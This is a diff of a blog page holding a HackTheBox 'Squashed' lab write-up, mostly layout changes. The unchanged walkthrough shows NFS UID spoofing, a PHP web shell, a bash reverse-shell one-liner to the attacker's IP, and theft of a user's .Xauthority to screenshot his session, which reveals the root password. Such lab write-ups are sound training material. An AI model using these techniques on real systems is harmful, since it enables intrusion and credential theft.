@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html id="doc" class="">
 <div id="particles-js">
 <head>
     <meta charset="UTF-8">
@@ -16,13 +16,22 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script src="/Scripts/js/particles.js"></script>
     <script src="/Scripts/js/app.js"></script>
-<title>Squashed HTB Writeup | 0xv01d</title>
-<meta property="og:locale" content="en_US">
-<script type="application/ld+json">
-</script>
+    <title>Squashed  HackTheBox Writeup | 0xv01d</title>
+    <meta property="og:locale" content="en_US">
+    <script type="application/ld+json">
+    </script>
 
-    <link rel="stylesheet" href="/Styles/style.css?v=">
+  <link rel="stylesheet" href="/Styles/style.css?v=">
 	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <!-- Bootstrap CSS -->
+    <!--<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>-->
+	<link rel="stylesheet" href="/Styles/style_darkwing.css">
+	<link rel="stylesheet" href="/Styles/footer.css">
+  <script src="/Scripts/js/bar.js"></script>
+
+
 <!-- Setup Google Analytics -->
 
 	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/squashed/favicon.ico">
@@ -31,33 +40,131 @@
 
   </head>
   <body>
-      <header class="app-header">
-        <a href="https:0xv01d.github.io">
-          <img class="avatar" src="/images/index/avatar.png">
-		</a><p></p>
-		<h1><strong>0xv01d</strong></h1>
-		<nav class="app-header-menu">
-			<a class="app-header-menu-item" href="/">Home</a>
-             - 
-			<a class="app-header-menu-item" href="/tags/">Tags</a>
-             - 
-			<a class="app-header-menu-item" href="/about/">About</a>
-		</nav>
-		<p>Just another computer adict.</p>
-		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
-			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
-			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
-			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
-			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
-		</div>
-        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
-			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
-        </a>
-        <div style="height: 7rem;"></div>
-      </header>
 
-      <main class="app-container">
-		
+
+        <aside id="menu" class="hide">
+            <div class="inner flex-row-vertical">
+                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+                    <i class="icon icon-lg icon-times-circle"></i>
+                    <!--        <i class="icon icon-lg icon-close"></i>-->
+                </a>
+                <div class="brand-wrap avatar-wrapper">
+                    <!--    <div class="brand-wrap avatar-wrapper" style="background-image:url(/images/index/avatar.png);"> -->
+                    <a href="https:0xv01d.github.io">
+                        <img class="avatar shake" src="/images/index/avatar.png">
+
+                    </a>
+                    <p></p>
+                    <h1 class="tubelight"><strong>0xv01d</strong></h1>
+                </div>
+
+                <div class="scroll-wrap flex-col">
+                    <ul class="nav">
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/">
+                                <i class="icon icon-lg icon-home"></i>
+                                Home
+                            </a>
+                        </li>
+<!--
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-archives"></i>
+                                Archives
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-tags"></i>
+                                Tags
+                            </a>
+                        </li>
+-->
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://github.com/0xv01d" target="_blank">
+                                <i class="icon icon-lg icon-github"></i>
+                                Github
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://infosec-0xv01d.medium.com/" target="_blank">
+                                <i class="icon_new fa-brands fa-medium"></i>
+                                <!--                <i class="icon icon-lg icon-medium"></i>-->
+                                Medium
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.youtube.com/@0xv01d_infosec" target="_blank">
+                                <i class="icon_new fa-brands fa-youtube"></i>
+                                Youtube
+                            </a>
+                        </li>
+                        
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#" target="_blank">
+                                <i class="icon_new fa-brands fa-twitch"></i>
+                                Twitch
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.linkedin.com/in/isaac-david-g-7bb187318?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app" target="_blank">
+                                <i class="icon_new fa-brands fa-linkedin"></i>
+                                Linkedin
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/about">
+                                <i class="icon icon-lg icon-link"></i>
+                                About
+                            </a>
+                        </li>
+                    </ul>
+                    <a style="padding-left: 0.7rem; padding-top: 3rem;"
+                        href="https://app.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+                        <img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+      <main id="main">
+<!--        class="app-container"> -->
+<div class="fixed-top" id="message"></div>
+      <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle" style="padding-right: 0.4rem;">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis" style="visibility: visible;">Squashed - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="fa-solid fa-language"></i>
+<!--                <i class="icon icon-lg icon-language"></i>-->
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+
+      </header>
+      
+  <div class="container body-wrap">
+
 		<article class="post">		
 			<header class="post-header">
 
@@ -89,14 +196,17 @@
 			which we can upload files that lead to gaining acces to the machine. After that, we find an Xauthority file that we can abuse to take a screenshot of another user's session that leaks the root password.
 
 <!--Machine Resolution-->
-			<h1 id="header-1">Recon</h1>
-
+			<h1 id="reconnaissance" class="toc-add toc-title">Reconnaissance</h1>
+      <h2 id="port_scan" class="toc-add">Port-Scan</h2>
             <p class="head-img">As always let's start with a port scan, we have ssh, http, rpc and nfs, as nfs is open we can take a look at the shared mounts</p>
             <img class="img-post" style="max-width: 1256px;" src="/images/HTB/squashed/nmap.png"></img>
             <img class="img-post" style="max-width: 1256px;" src="/images/HTB/squashed/nmap_2.png"></img>
 
+            <h2 id="shared_mounts" class="toc-add">Shared Mounts Exploration</h2>
+            <h3 id="nfs_mounting" class="toc-add" style="margin-top: 2rem;">NFS Mounting</h3>
             <p class="head-img">We have two shared mounts, let's mount them</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">showmount</span> -e 10.10.11.191
 Export list for 10.10.11.191:
 /home/ross    *
@@ -107,8 +217,10 @@ Export list for 10.10.11.191:
 <span class="na">❯ </span><span class="kt">sudo mount</span> -t nfs 10.10.11.191:/var/www/html /tmp/www
 </span> </code></pre></div></div>
 
-			<p class="head-img">Once we mount them we can see some interesting files, in /home/ross we can see a Passwords.kdbx file which is a keepass database, also a .Xauthority that manage the GUI, among other stuff, we also can't acces in /var/www/html, that's because we don't own or belong to the group, but we can add another user to acces</p>
-		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<h3 id="mount_enum" class="toc-add" style="margin-top: 2rem;">Mount Enumeration</h3>
+			<p class="head-img">Once we mount them we can see some interesting files, in /home/ross we can see a Passwords.kdbx file which is a keepass database, also the .Xauthority file that is used by X11 for authorization, among other stuff, we also can't acces in /var/www/html, that's because we don't own or belong to the group, but we can add another user to acces</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight">
+      <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">ls</span> -l
 <span class="x">d</span><span class="kt">r</span><span class="ng">w</span><span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span> <span class="k">1001    1001     4.0 KB</span> <span class="na">Sun Jan  1 18:02:37 2023</span> <span class="x"> home_ross</span>
 <span class="x">d</span><span class="kt">r</span><span class="ng">w</span><span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span><span class="kt">r</span>-- <span class="k">2017    www-data 4.0 KB</span><span class="na"> Mon Jan  2 16:25:01 2023</span> <span class="x"> www</span>
@@ -145,8 +257,11 @@ Export list for 10.10.11.191:
 cd: permission denied: ./www
 </span> </code></pre></div></div>
 
+<h1 id="initial_access" class="toc-add toc-title" style="margin-top: 2em;">Initial Access</h1>
+<h2 id="adding_user" class="toc-add">Adding User</h2>
             <p class="head-img">Once we add it, we can get in</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="na">❯ </span><span class="kt">sudo useradd</span> test
 <span class="na">❯ </span><span class="kt">sudo usermod</span> -u 2017 test
 <span class="na">❯ </span><span class="kt">sudo groupmod</span> -g 2017 test
@@ -162,9 +277,10 @@ $ bash
 <span class="x">d</span><span class="kt">r</span><span class="ng">w</span><span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span><span class="kt">r</span>-- <span class="k">test    www-data 4.0 KB</span><span class="na"> Mon Jan  2 16:25:01 2023</span> <span class="x"> www</span>
 </span> </code></pre></div></div>
 
-
+<h2 id="reverse_shell" class="toc-add">Reverse Shell Setup</h2>
             <p class="head-img">Since we can write on it, let's send us a reverse shell</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">echo</span> <span class="k">"<<span>?</span>php   echo '<<span>pre</span>>' . shell_exec($_REQUEST['cmd']) . '<<span>/pre</span>>'; ?>"</span> > /tmp/www/shell.php
 
 <span class="na">❯ </span><span class="kt">curl</span>  <span class="k">"http://10.10.11.191/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.30/443%200%3E%261%22"</span>
@@ -178,25 +294,29 @@ alex
 <span class="kt">alex@squashed</span>:/var/www/html$ 
 </span> </code></pre></div></div>
 
+<h2 id="user_flag" class="toc-add">User Flag</h2>
 
             <p class="head-img">Once we're in we can read the first flag</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="kt">alex@squashed</span>:/home/alex$ cat user.txt 
 448f5f993960efc1a27a783c4229cf59
 <span class="kt">alex@squashed</span>:/home/alex$ 
 </span> </code></pre></div></div>
 
 			<p class="head-img"></p>
-			<h1 id="header-1">PrivEsc</h1>
-
+			<h1 id="privesc" class="toc-add toc-title">Privilege Escalation</h1>
+      <h2 id="privesc_enumeration" class="toc-add">Enumeration</h2>
 			<p class="head-img">As we saw before in /home/ross there's a kdbx file, but once we try to extract the hash in order to crack it we can see that the version is not supported by john</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">keepass2john</span> Passwords.kdbx
 ! Passwords.kdbx : File version '40000' is currently not supported!
 </span> </code></pre></div></div>
 
             <p class="head-img">However, we saw the .Xauthority file, and as we can see, Ross has an active X session that we can take advantage of.</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="kt">alex@squashed</span>:/home/alex$ w
  01:21:05 up 1 day,  2:18,  1 user,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -204,8 +324,12 @@ ross     tty7     :0               Sun23   26:18m  4:07   0.07s /usr/libexec/gn
 <span class="kt">alex@squashed</span>:/home/alex$ 
 </span> </code></pre></div></div>
 
+<h2 id="exploiting_xauthority" class="toc-add">Exploiting .Xauthority</h2>
+<h3 id="mimic_user" class="toc-add" style="margin-top: 2rem;">Creating a Mimic User</h3>
+
             <p class="head-img">Well, in order to exploit the <a href="https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11" rel="nonreferrer noopener" target="_blank">.Xauthority</a>, we have to create a user with the specified id which is 1001</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="na">❯ </span><span class="kt">sudo useradd</span> test2
 <span class="na">❯ </span><span class="kt">sudo usermod</span> -u 1001 test2
 <span class="na">❯ </span><span class="kt">su</span> test2
@@ -218,8 +342,11 @@ $ bash
 -<span class="kt">r</span><span class="ng">w</span>------- <span class="k">test2    1001 57</span><span class="na"> Jan  1 17:02 </span> <span class="x"> ./.Xauthority</span>
 </span> </code></pre></div></div>
 
+<h3 id="xauthority_transfer" class="toc-add" style="margin-top: 2rem;">Xauthority Transfer and Connection</h3>
+
             <p class="head-img">Let's mount a python server and transfer the file from the mount to the machine, so we will have the same .Xauthority as ross</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="na">❯ </span><span class="kt">python3</span> -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
@@ -239,9 +366,11 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 10.10.11.191 - - [02/Jan/2023 20:56:05] "GET /.Xauthority HTTP/1.1" 200 -
 </span> </code></pre></div></div>
 
+<h3 id="screen_shot" class="toc-add" style="margin-top: 2rem;">Screenshot Capture and Transfer</h3>
 
             <p class="head-img">Let's check the connection, and as we can see, Ross has the keepass open, and we could try to take a screen shot of his screen, with some luck we can get something juicy</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="kt">alex@squashed</span>:~$ xdpyinfo -display :0
 <....................................................>
   visual:
@@ -275,7 +404,8 @@ xwininfo: Window id: 0x533 (the root window) (has no name)
 </span> </code></pre></div></div>
 
             <p class="head-img">Let's take the screenshot, and transfer it to our machine</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="kt">alex@squashed</span>:~$ xwd -root -screen -silent -display :0 > screenshot.xwd
 <span class="kt">alex@squashed</span>:~$ file ./screenshot.xwd 
 ./screenshot.xwd: XWD X Window Dump image data, "xwdump", 800x600x24
@@ -299,8 +429,11 @@ connect to [10.10.16.30] from (UNKNOWN) [10.10.11.191] 54166
             <p class="head-img">Once we display it, we can see a password that appears to be the root's password</p>
             <img class="img-post" style="max-width: 800px;" src="/images/HTB/squashed/keepass_ss.png"></img>
 
+<h2 id="screen_shot" class="toc-add">Root Flag</h2>
+
             <p class="head-img">It is, and that's it, we own it</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="kt">alex@squashed</span>:~$ su root 
 Password: <span class="gd">cah$mei7rai9A</span>
 <span class="kt">root@squashed</span>:/home/alex# whoami
@@ -312,9 +445,185 @@ uid=0(root) gid=0(root) groups=0(root)
 <span class="kt">root@squashed</span>:/home/alex# 
 </span> </code></pre></div></div>
 
-<a href="#">Go back</a>
 		</article>
+
+<aside class="post-widget">
+   <nav class="post-toc-wrap fixed" id="post-toc">
+      <h4>Table of contents</h4>
+      <ol class="post-toc">
+      </ol>
+   </nav>
+</aside>
+
+<a href="https://www.buymeacoffee.com/0xv01d" target="_blank" style="margin-top: 1rem;"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+
+    </div>
+<article id="wrap">
+	<article id="lightings">
+    	<section id="one">
+            <section id="two">
+                <section id="three">
+                    <section id="four">
+                        <section id="five">
+                            
+                        </section>
+                    </section>
+                </section>
+            </section>
+		</section>
+    </article>
+</article>
+
+    <footer class="footer">
+    <div class="bottom">
+        <p><span>0xv01d © 2022 - 2024</span>
+        </p>
+    </div>
+</footer> 
       </main>
+      <div id="mask" class="mask"></div>
+<a href="#" id="gotop" class="waves-effect waves-circle waves-light in"><span class="icon icon-lg icon-chevron-up"></span></a>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var gotopButton = document.getElementById("gotop");
+
+            // Show/hide the button based on scroll position
+            window.addEventListener("scroll", function () {
+                if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                    gotopButton.style.opacity = "1";
+                } else {
+                    gotopButton.style.opacity = "0";
+                }
+            });
+
+            // Smooth scroll to top when the button is clicked
+            gotopButton.addEventListener("click", function (event) {
+                event.preventDefault();
+
+                // Use the scrollIntoView method with behavior: 'smooth'
+                document.body.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            });
+        });
+
+    </script>
+    <script>
+        function copyToClipboard(button) {
+            // Find the nearest .highlight parent of the clicked button
+            const codeElement = button.closest('.highlight');
+
+            if (codeElement) {
+                // Clone the code element to exclude the button
+                const codeClone = codeElement.cloneNode(true);
+
+                // Remove the button from the clone
+                const buttons = codeClone.querySelectorAll('.copy-btn');
+                buttons.forEach((btn) => btn.remove());
+
+                const codeText = codeClone.innerText;
+
+                // Create a temporary textarea element to copy the text
+                const textarea = document.createElement('textarea');
+                textarea.value = codeText;
+                document.body.appendChild(textarea);
+
+                // Select and copy the text
+                textarea.select();
+                document.execCommand('copy');
+
+                // Remove the temporary textarea
+                document.body.removeChild(textarea);
+
+                // Change the icon in the button to "fa-check"
+                const iconElement = button.querySelector('i');
+                if (iconElement) {
+                  iconElement.classList.remove('fa-clipboard');
+                  iconElement.classList.add('fa-check', 'green-icon');
+                }
+
+                // Temporarily change the icon back to "fa-clipboard" after 2000 milliseconds (2 seconds)
+                setTimeout(() => {
+                  if (iconElement) {
+                    iconElement.classList.remove('fa-check', 'green-icon');
+                    iconElement.classList.add('fa-clipboard');
+                  }
+                }, 2000);
+            } else {
+                console.error('Unable to find the code element');
+            }
+        }
+    </script>
+
+
+    <script>
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+        menu.classList.toggle('hide');
+    });
+
+    document.getElementById('menu-off').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Agregar la clase 'hide' para ocultar el menú
+        menu.classList.add('hide');
+    });
+</script>
+
+<script>
+    function lock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.toggle('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.remove('hide')
+            menu.classList.toggle('show')
+            mask.classList.add('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+        }
+    }
+
+    function unlock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.remove('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.toggle('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+            menu.classList.add('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        }
+    }
+
+    // Llamar a la función al cargar la página y cuando se redimensiona la ventana
+//    window.addEventListener('load', lock);
+//    window.addEventListener('resize', unlock);
+
+    // Añadir el evento click al botón de menú
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        lock();  // Actualizar visibilidad del menú al hacer clic en el botón
+    });
+
+    // Añadir el evento click al botón de ocultar menú
+    document.getElementById('menu-off').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+    
+    document.getElementById('mask').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+</script>
+
+
   </body>
 </div>
 </html>
